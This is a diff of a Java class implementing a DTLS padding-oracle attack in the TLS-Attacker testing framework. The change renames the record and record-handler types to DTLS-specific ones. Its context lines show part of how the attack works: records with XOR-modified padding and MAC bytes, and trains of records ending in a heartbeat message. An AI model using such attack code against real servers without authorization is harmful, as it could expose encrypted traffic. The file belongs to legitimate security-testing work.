@@ -21,7 +21,7 @@ package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.tlsattacker.attacks.config.DtlsPaddingOracleAttackCommandConfig;
 import de.rub.nds.tlsattacker.tls.Attacker;
-import de.rub.nds.tlsattacker.dtls.record.RecordHandler;
+import de.rub.nds.tlsattacker.dtls.record.DtlsRecordHandler;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
@@ -31,7 +31,7 @@ import de.rub.nds.tlsattacker.tls.protocol.alert.AlertMessage;
 import de.rub.nds.tlsattacker.tls.protocol.application.ApplicationMessage;
 import de.rub.nds.tlsattacker.tls.constants.ProtocolMessageType;
 import de.rub.nds.tlsattacker.tls.protocol.heartbeat.HeartbeatMessage;
-import de.rub.nds.tlsattacker.dtls.record.Record;
+import de.rub.nds.tlsattacker.dtls.record.DtlsRecord;
 import de.rub.nds.tlsattacker.tls.constants.AlertDescription;
 import de.rub.nds.tlsattacker.tls.constants.AlertLevel;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
@@ -61,7 +61,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 
     private TlsContext tlsContext;
 
-    private RecordHandler recordHandler;
+    private DtlsRecordHandler recordHandler;
 
     private List<ProtocolMessage> protocolMessages;
 
@@ -226,18 +226,18 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
 	ApplicationMessage apMessage = new ApplicationMessage(ConnectionEnd.CLIENT);
 	protocolMessages.add(apMessage);
-	Record record;
+	DtlsRecord record;
 	apMessage.setData(messageData);
 
 	for (int i = 0; i < n; i++) {
-	    record = new Record();
+	    record = new DtlsRecord();
 	    record.setPadding(modifiedPaddingArray);
 	    records.add(record);
 	    train[i] = recordHandler.wrapData(messageData, ProtocolMessageType.APPLICATION_DATA, records);
 	    records.remove(0);
 	}
 
-	records.add(new Record());
+	records.add(new DtlsRecord());
 	protocolMessages.add(heartbeatMessage);
 	train[n] = recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
 		ProtocolMessageType.HEARTBEAT, records);
@@ -253,7 +253,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	protocolMessages.add(apMessage);
 	apMessage.setData(applicationMessageContent);
 
-	Record record = new Record();
+	DtlsRecord record = new DtlsRecord();
 	record.setMac(modifiedMacArray);
 	record.setPadding(modifiedPaddingArray);
 	records.add(record);
@@ -265,7 +265,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	}
 
 	records.remove(0);
-	records.add(new Record());
+	records.add(new DtlsRecord());
 	protocolMessages.add(heartbeatMessage);
 	train[n] = (recordHandler.wrapData(heartbeatMessage.getCompleteResultingMessage().getValue(),
 		ProtocolMessageType.HEARTBEAT, records));
@@ -277,7 +277,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	AlertMessage closeNotify = new AlertMessage();
 	closeNotify.setConfig(AlertLevel.WARNING, AlertDescription.CLOSE_NOTIFY);
 	List<de.rub.nds.tlsattacker.tls.record.Record> records = new ArrayList<>();
-	records.add(new Record());
+	records.add(new DtlsRecord());
 
 	try {
 	    transportHandler.sendData(recordHandler.wrapData(closeNotify.getProtocolMessageHandler(tlsContext)
@@ -292,7 +292,7 @@ public class DtlsPaddingOracleAttack extends Attacker<DtlsPaddingOracleAttackCom
 	transportHandler.setTlsTimeout(config.getTimeout());
 	tlsContext = configHandler.initializeTlsContext(config);
 	workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
-	recordHandler = (RecordHandler) tlsContext.getRecordHandler();
+	recordHandler = (DtlsRecordHandler) tlsContext.getRecordHandler();
 	trace = tlsContext.getWorkflowTrace();
 	protocolMessages = trace.getProtocolMessages();
 	modifiedPaddingArray.setModification(ByteArrayModificationFactory.xor(new byte[] { 1 }, 0));
